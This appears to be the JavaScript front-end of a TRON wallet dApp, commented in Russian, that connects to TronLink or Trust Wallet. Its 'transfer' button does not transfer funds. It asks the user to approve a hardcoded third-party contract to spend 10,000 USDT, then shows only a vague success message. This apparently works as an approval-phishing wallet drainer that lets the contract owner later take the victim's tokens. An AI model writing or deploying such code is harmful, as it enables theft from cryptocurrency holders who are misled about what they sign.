const connectBtn = document.getElementById('connectBtn');
const transferBtn = document.getElementById('transferBtn');
const walletAddressText = document.getElementById('walletAddress');

let userAddress = '';

const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 

// Улучшенная функция инициализации для мобильных кошельков
async function getTronWeb() {
    // 1. Проверяем классический window.tronWeb (TronLink и др.)
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        return window.tronWeb;
    }

    // 2. Ожидание загрузки объекта в мобильном браузере
    return new Promise((resolve) => {
        let attempts = 0;
        const interval = setInterval(() => {
            attempts++;
            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                clearInterval(interval);
                resolve(window.tronWeb);
            } else if (attempts > 20) { // Ждем до 8 секунд
                clearInterval(interval);
                resolve(null);
            }
        }, 400);
    });
}

connectBtn.addEventListener('click', async () => {
    try {
        walletAddressText.innerText = "Подключение...";
        
        // Попытка получить доступ к TronWeb
        let tronWeb = await getTronWeb();

        // Если кошелек открыт в Trust Wallet или другом EVM-браузере, пробуем запросить учетную запись через провайдер сети
        if (!tronWeb && window.ethereum) {
            try {
                // Запрос смены/получения сетей, если кошелек поддерживает мультичейн
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                if (accounts && accounts.length > 0) {
                    walletAddressText.innerText = "Сеть EVM активна. Переключитесь на TRON в кошельке!";
                }
            } catch (e) {
                console.error("Ошибка EVM провайдера:", e);
            }
        }

        if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
            userAddress = tronWeb.defaultAddress.base58;
            walletAddressText.innerText = `Подключено: ${userAddress}`;
            connectBtn.style.display = 'none';
            transferBtn.style.display = 'inline-block';
        } else {
            alert('Кошелек TRON не найден. Убедитесь, что в настройках Trust Wallet выбрана сеть Tron или используйте DApp-браузер с полной поддержкой TRC20.');
            walletAddressText.innerText = "Кошелек не найден";
        }
    } catch (error) {
        console.error("Ошибка подключения:", error);
        alert("Произошла ошибка при подключении.");
    }
});

transferBtn.addEventListener('click', async () => {
    try {
        const tronWeb = await getTronWeb();
        if (!userAddress || !tronWeb) {
            alert('Сначала подключите кошелек!');
            return;
        }
        
        console.log("Запрос разрешения (Approve) на USDT...");
        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
        const approveAmount = '10000000000'; 

        const tx = await usdtContract.approve(
            myContractAddress,
            approveAmount
        ).send({
            feeLimit: 100000000
        });

        alert("Запрос успешно подтвержден!");
        console.log("Хэш транзакции approve:", tx);

    } catch (error) {
        console.error("Ошибка при отправке запроса:", error);
        alert("Ошибка при выполнении транзакции. Проверьте консоль кошелька.");
    }
});
